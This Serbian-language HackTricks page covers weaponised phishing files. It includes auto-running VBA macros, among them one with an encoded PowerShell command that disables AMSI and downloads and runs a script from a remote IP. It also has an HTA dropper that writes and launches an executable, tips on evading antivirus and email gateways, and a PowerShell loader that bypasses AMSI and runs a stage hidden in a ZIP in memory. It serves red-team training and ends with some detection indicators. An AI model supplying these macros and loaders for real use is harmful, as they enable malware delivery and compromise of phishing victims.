# Phishing fajlovi i dokumenti

{{#include ../../banners/hacktricks-training.md}}

## Office dokumenti

Microsoft Word vrši validaciju podataka fajla pre otvaranja. Validacija podataka se vrši u obliku identifikacije strukture podataka, u skladu sa OfficeOpenXML standardom. Ako dođe do bilo koje greške tokom identifikacije strukture podataka, fajl koji se analizira neće biti otvoren.

Obično Word fajlovi koji sadrže macros koriste `.docm` ekstenziju. Međutim, moguće je preimenovati fajl promenom ekstenzije i ipak zadržati mogućnost izvršavanja njihovih macros.\  
Na primer, RTF fajl po dizajnu ne podržava macros, ali DOCM fajl preimenovan u RTF će biti tretiran od strane Microsoft Word i biće sposoban za izvršavanje macros.\  
Isti internals i mehanizmi važe za sav softver iz Microsoft Office Suite (Excel, PowerPoint etc.).

Možete koristiti sledeću komandu da proverite koje ekstenzije će biti izvršavane od strane nekih Office programa:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX fajlovi koji referenciraju udaljeni template (File –Options –Add-ins –Manage: Templates –Go) koji uključuje macros mogu takođe “izvršavati” macros.

### Učitavanje eksternih slika

Idite na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Moguće je koristiti macros za pokretanje proizvoljnog koda iz dokumenta.

#### Funkcije za automatsko učitavanje

Što su češće, to je verovatnije da će ih AV detektovati.

- AutoOpen()
- Document_Open()

#### Macros Primeri koda
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ručno uklonite metapodatke

Idite na **File > Info > Inspect Document > Inspect Document**, što će otvoriti Inspektor dokumenta. Kliknite **Inspect** i zatim **Remove All** pored **Document Properties and Personal Information**.

#### Ekstenzija dokumenta

Kada završite, izaberite padajući meni **Save as type**, promenite format sa **`.docx`** na **Word 97-2003 `.doc`**.\
Uradite ovo zato što **ne možete sačuvati makroe unutar `.docx`** i postoji **stigmatizacija** oko makro-omogućenog **`.docm`** formata (npr. sličica ima veliki `!` i neki web/email gateway-ovi ih potpuno blokiraju). Stoga je ova **nasleđena `.doc` ekstenzija najbolji kompromis**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

HTA je Windows program koji **kombinuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao aplikacija kojoj je u potpunosti verovano, bez ograničenja sigurnosnog modela pregledača.

HTA se izvršava pomoću **`mshta.exe`**, koji je obično **instaliran** zajedno sa **Internet Explorer**, što čini **`mshta` dependant on IE**. Dakle, ako je on deinstaliran, HTA fajlovi neće moći da se izvrše.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forsiranje NTLM autentifikacije

Postoji nekoliko načina da **forsirate NTLM autentifikaciju "remotely"**, na primer, možete dodati **nevidljive slike** u emailove ili HTML koje će korisnik otvoriti (čak i HTTP MitM?). Ili poslati žrtvi **adresu fajlova** koja će **pokrenuti** **autentifikaciju** samo otvaranjem fascikle.

**Pogledajte ove ideje i još više na sledećim stranicama:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Ne zaboravite da ne možete samo ukrasti heš ili autentifikaciju, već i **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Vrlo efikasne kampanje isporučuju ZIP koji sadrži dva legitimna decoy dokumenta (PDF/DOCX) i maliciozni .lnk. Trik je u tome da je stvarni PowerShell loader smešten unutar sirovih bajtova ZIP-a nakon jedinstvenog markera, a .lnk ga izdvoji i izvršava potpuno u memoriji.

Tipičan tok koji implementira .lnk PowerShell one-liner:

1) Pronađi originalni ZIP u uobičajenim putanjama: Desktop, Downloads, Documents, %TEMP%, %ProgramData% i roditeljskom direktorijumu trenutnog radnog direktorijuma.
2) Pročitaj bajtove ZIP-a i pronađi hardkodovani marker (npr. xFIQCV). Sve posle markera je ugrađeni PowerShell payload.
3) Kopiraj ZIP u %ProgramData%, ekstrahuj tamo i otvori decoy .docx da bi izgledalo legitimno.
4) Zaobiđi AMSI za trenutni proces: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskuj sledeću fazu (npr. ukloni sve # karaktere) i izvrši je u memoriji.

Primer PowerShell kostura za izdvajanje i pokretanje ugrađene faze:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Napomene
- Dostava često zloupotrebljava ugledne PaaS poddomene (npr. *.herokuapp.com) i može uslovljavati payloads (servira benign ZIPs bazirano na IP/UA).
- Sledeća faza često dekriptuje base64/XOR shellcode i izvršava ga putem Reflection.Emit + VirtualAlloc kako bi se minimizovali artefakti na disku.

Persistence korišćena u istom lancu
- COM TypeLib hijacking of the Microsoft Web Browser control tako da IE/Explorer ili bilo koja aplikacija koja ga ugrađuje ponovo automatski pokreće payload. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP fajlovi koji sadrže ASCII marker string (npr. xFIQCV) dodat na podatke arhive.
- .lnk koji enumeriše parent/user foldere da pronađe ZIP i otvara decoy dokument.
- AMSI manipulacija putem [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Dugotrajne poslovne konverzacije koje se završavaju linkovima hostovanim na pouzdanim PaaS domenima.

## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
